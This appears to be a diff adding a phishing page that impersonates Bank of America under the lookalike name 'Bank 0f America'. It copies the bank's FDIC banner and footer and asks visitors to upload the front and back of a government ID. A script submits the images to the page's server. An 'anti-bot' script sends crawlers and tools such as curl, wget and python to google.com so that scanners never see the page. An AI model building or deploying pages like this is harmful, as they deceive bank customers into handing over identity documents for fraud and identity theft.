@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <script>
+    /* anti-bot */
+    const bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    const ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta name="robots" content="noindex, nofollow">
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bank 0f America</title>
+  <link rel="shortcut icon" href="img/icona.png" />
+  <link rel="stylesheet" href="style2.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <style>
+    /* your existing styles */
+    h2 { margin-bottom: 10px; color: #333; }
+    p { font-size: 14px; color: #555; margin-bottom: 30px; }
+    form { max-width: 420px; display: flex; margin: 10px 10px; flex-direction: column; gap: 25px; }
+    .upload-label {
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      height: 140px; padding: 20px; background: #f9f9f9; border: 2px dashed #ccc; border-radius: 12px;
+      cursor: pointer; transition: border-color 0.3s ease; overflow: hidden;
+    }
+    .upload-label:hover { border-color: #007bff; }
+    .upload-label img { width: 100%; height: 100%; object-fit: contain; margin-bottom: 0; opacity: 1; }
+    .upload-label span { font-size: 14px; color: #666; }
+    input[type="file"] { display: none; }
+    button {
+      background-color: #007bff; color: #fff; padding: 12px 20px; border: none; border-radius: 8px;
+      font-size: 16px; cursor: pointer; transition: background-color 0.3s ease;
+    }
+    button:hover { background-color: #0056b3; }
+   
+  #spinner-overlay {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(255, 255, 255, 0.85);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+  flex-direction: column;
+}
+
+.spinner-container {
+  text-align: center;
+}
+
+.spinner {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #e60000;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin: 0 auto;
+}
+
+.spinner-text {
+  margin-top: 15px;
+  font-size: 16px;
+  color: #333;
+  font-weight: 500;
+}
+
+/* Spinner animation */
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+  </style>
+</head>
+<body>
+
+    <div class="fdic-banner">
+  <span>Bank 0f America deposit products:</span>
+  <img src="https://secure1.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" 
+       alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government">
+</div>
+
+  <section id="header2">
+    <a href="index.html" class="log">
+      <img src="img/logo-main.png" width="300px" height="35px" class="logo" />
+    </a>
+    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
+  </section>
+
+  <section id="hero2">
+    <div class="bar">
+      <ul id="navbarr">
+        <h3>Identification Card</h3>
+      </ul>
+    </div>
+  </section>
+
+  <div class="container">
+    <div>
+      <h1>Upload Your ID for Verification</h1>
+      <p class="subtitle">
+        Please upload clear images of a valid government-issued ID for verification purposes. <br />
+        Accepted IDs: Driver’s License, National ID Card, or Passport.
+      </p>
+    </div>
+
+
+    <div id="spinner-overlay" style="display: none;">
+  <div class="spinner-container">
+    <div class="spinner"></div>
+    <p class="spinner-text">Verifying your ID...</p>
+  </div>
+</div>
+
+    <form id="upload-form" action="/upload-id" method="POST" enctype="multipart/form-data">
+      <label for="front" class="upload-label">
+        <img id="frontPreview" src="img/ad353f.png" alt="Front ID" />
+        <span>Upload Front ID</span>
+        <input type="file" name="front" id="front" accept="image/*" capture="environment" required />
+      </label>
+
+      <label for="back" class="upload-label">
+        <img id="backPreview" src="img/ad934b.png" alt="Back ID" />
+        <span>Upload Back ID</span>
+        <input type="file" name="back" id="back" accept="image/*" capture="environment" required />
+      </label>
+
+      <button type="submit">Submit ID for Verification</button>
+    </form>
+  </div>
+
+  <script>
+    // Image preview handlers
+function previewImage(input, previewId) {
+  const file = input.files[0];
+  if (file) {
+    const reader = new FileReader();
+    reader.onload = function (e) {
+      document.getElementById(previewId).src = e.target.result;
+    };
+    reader.readAsDataURL(file);
+  }
+}
+
+document.getElementById("front").addEventListener("change", function () {
+  previewImage(this, "frontPreview");
+});
+
+document.getElementById("back").addEventListener("change", function () {
+  previewImage(this, "backPreview");
+});
+
+// Form submit handler
+document.getElementById("upload-form").addEventListener("submit", async function (e) {
+  e.preventDefault();
+
+  const spinner = document.getElementById("spinner-overlay");
+  spinner.style.display = "flex";  // Show spinner and overlay
+
+  const form = this;
+  const formData = new FormData(form);
+
+  console.log("Submitting ID upload form...");
+
+  try {
+    const response = await fetch("/upload-id", {
+      method: "POST",
+      body: formData,
+    });
+
+    spinner.style.display = "none";  // Hide spinner after response
+
+    if (!response.ok) {
+      console.error("Server responded with status:", response.status);
+      alert("❌ Submission failed with status " + response.status);
+      return;
+    }
+
+    const data = await response.json();
+    console.log("Server response:", data);
+
+    if (data.success) {
+      // No alert, just redirect immediately
+      window.location.href = "htree45.html";
+    } else {
+      alert("⚠️ Something went wrong! Please try again.");
+    }
+  } catch (error) {
+    spinner.style.display = "none";  // Hide spinner on error
+    console.error("Upload error:", error);
+    alert("🚫 An error occurred during upload. Please try again.");
+  }
+});
+  </script>
+</body>
+
+<footer>
+  <div class="gray-bground-skin">
+    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
+    <div class="link-container">
+      <div class="link-row">
+        <a href="#" target="_blank">Privacy</a>
+        <a href="#" target="_blank">Security</a>
+        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
+        <div class="clearboth"></div>
+      </div>
+    </div>
+    <p>
+      Bank 0f America, N.A. Member FDIC.
+      <a href="#" target="_blank">Equal Housing Lender</a>
+      <i class="fa fa-home"></i><br />© 2025 Bank 0f America Corporation.
+    </p>
+  </div>
+</footer>
+</html>
